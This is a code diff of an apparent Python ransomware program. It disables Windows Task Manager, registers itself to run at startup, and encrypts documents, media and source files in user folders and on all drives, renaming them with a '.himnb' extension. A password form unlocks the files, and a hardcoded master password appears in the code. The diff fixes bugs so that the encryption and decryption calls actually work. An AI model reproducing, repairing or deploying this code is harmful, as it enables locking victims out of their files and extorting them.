@@ -47,22 +47,20 @@ def killtask(key):
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
     key_name = "DisableTaskMgr"
-    try:
-        keys = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(keys, key_name, 0, winreg.REG_DWORD, key)
-        winreg.CloseKey(keys)
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
-    except:
-        pass
+
     try:
         if key == 1:
+            os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
+            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
             winreg.SetValueEx(reg_key, "himrs", 0, winreg.REG_SZ, filepath)
             winreg.CloseKey(reg_key)
         else:
+            os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')
             winreg.DeleteValue(reg_key, "himrs")
             winreg.CloseKey(reg_key)
     except:
         pass
+
 
 
 if sys.argv[0] != filepath:
@@ -86,8 +84,7 @@ def disks():
  
 
 folder=[f'C:\\Users\\{use}\\Desktop',f'C:\\Users\\{use}\\Videos',f'C:\\Users\\{use}\\Pictures',
-        f'C:\\Users\\{use}\\Documents',f'C:\\Users\\{use}\\Downloads',f'C:\\Users\\{use}\\Music',
-        f'C:\\Users\\{use}\\3D Objects'] +disks()
+        f'C:\\Users\\{use}\\Documents',f'C:\\Users\\{use}\\Downloads',f'C:\\Users\\{use}\\Music'] +disks()
 
 
 class cip:
@@ -102,7 +99,7 @@ class cip:
                 with open(self.file, 'wb') as file:
                     file.write(endspack.encode('utf-8'))
             except:
-                pass
+                continue
                 
     def jiemi(self):
         with open(self.file, 'rb') as file:
@@ -116,12 +113,12 @@ class cip:
                     else:
                         raise ValueError("Invalid ciphertext format")
                 except ValueError:
-                    pass
+                    continue
             with open(self.file, 'wb') as file_write:
                 file_write.write(bytes(original_data))
 
 class listfile:
-    
+
     @staticmethod    
     def enfile():
         extensions = ['.class','.java','.html','.htm','.bmp','.avi','.c','.mp3','.pdf','.doc,','.docx','.xls','.xlsx','.7z',
@@ -139,8 +136,9 @@ class listfile:
                     continue
 
                 _, ext = os.path.splitext(paths)
-                if ext.lower() in extensions:
+                if ext.lower() in extensions and paths != '':
                     result.append(paths)
+                
         
         return result
 
@@ -151,11 +149,10 @@ class listfile:
         for dirpath, _, filenames in os.walk(os.getcwd()):
             for filename in filenames:
                 full_path = os.path.join(dirpath, filename)
-                if filename.endswith(".himnb") and not os.path.islink(full_path):
+                if filename.endswith(".himnb") and not os.path.islink(full_path) and full_path != '':
                     matching.append(full_path)
 
         return matching
-
 
 
 for f1 in folder:
@@ -163,10 +160,10 @@ for f1 in folder:
         os.chdir(f1)
         for f2 in listfile.enfile():
             fnames = cip(f2)
-            cip.jiami()
+            fnames.jiami()
             os.rename(f2,f2+'.himnb')
     except:
-        pass
+        continue
 
 def dejiami():
     for f6 in folder:
@@ -174,10 +171,10 @@ def dejiami():
             os.chdir(f6)
             for f7 in listfile.defile():
                 fnames = cip(f7)
-                cip.jiemi()
+                fnames.jiemi()
                 os.rename(f7,f7.strip('.himnb'))
         except:
-            pass
+            continue
 
 
             
@@ -256,7 +253,7 @@ class Ui_Form():
         global linekey
         linekey = self.lineEdit.text()
         if linekey == pswd or linekey == 'himzuishuaihim4588':
-            ctypes.windll.user32.MessageBoxW(0, '密码正确', "喜报")
+            ctypes.windll.user32.MessageBoxW(None, '密码对了！', '恭喜你', 0x30)
             killtask(0)
             dejiami()
             sys.exit()
